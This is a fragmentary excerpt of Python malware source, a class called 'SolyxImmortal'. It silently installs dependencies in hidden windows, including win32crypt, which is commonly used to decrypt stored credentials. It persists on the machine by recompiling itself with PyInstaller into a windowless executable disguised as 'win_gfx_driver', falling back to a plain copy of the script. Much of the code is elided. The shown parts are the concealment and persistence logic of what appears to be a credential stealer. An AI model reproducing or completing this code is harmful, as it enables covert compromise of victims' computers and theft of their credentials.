...
def install_missing_packages():
    """Automatically installs all required pip packages on first run"""
    ...
    required_packages = [
        ...
        'pillow'         # PIL/pyautogui dependency
    ]
    ...
    # Hide the installation window completely
    startupinfo = None
    ...
    # Special handling for win32crypt (part of pywin32)
    try:
        __import__('win32crypt')
    except ImportError:
        subprocess.run(
...
try:
    ...
    # Fallback if still missing - but bootstrap should have handled it
    import subprocess
...
class SolyxImmortal:
    ...
    def _persist(self):
        ...
        # If running as script, convert to exe on first run
        if sys.argv[0].endswith('.py'):
            try:
                # Attempt to compile itself to exe for better persistence
                import subprocess
                hidden = subprocess.STARTUPINFO()
                hidden.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                hidden.wShowWindow = subprocess.SW_HIDE
                
                temp_py = os.path.join(self.temp, "compiled_script.py")
                with open(__file__, 'r') as src:
                    content = src.read()
                with open(temp_py, 'w') as dst:
                    dst.write(content)
                
                # Try to use auto-py-to-exe or pyinstaller if available
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', 'pyinstaller'], 
                              startupinfo=hidden, capture_output=True)
                subprocess.run([sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', 
                               '--name', 'win_gfx_driver', temp_py], 
                              startupinfo=hidden, capture_output=True, cwd=self.temp)
            except:
                pass
        ...
        if not os.path.exists(target_file):
            # If we're a .py file and can't convert, just copy the script
            if sys.argv[0].endswith('.py'):
                shutil.copy2(sys.argv[0], target_file.replace('.exe', '.py'))
                target_file = target_file.replace('.exe', '.py')
            else:
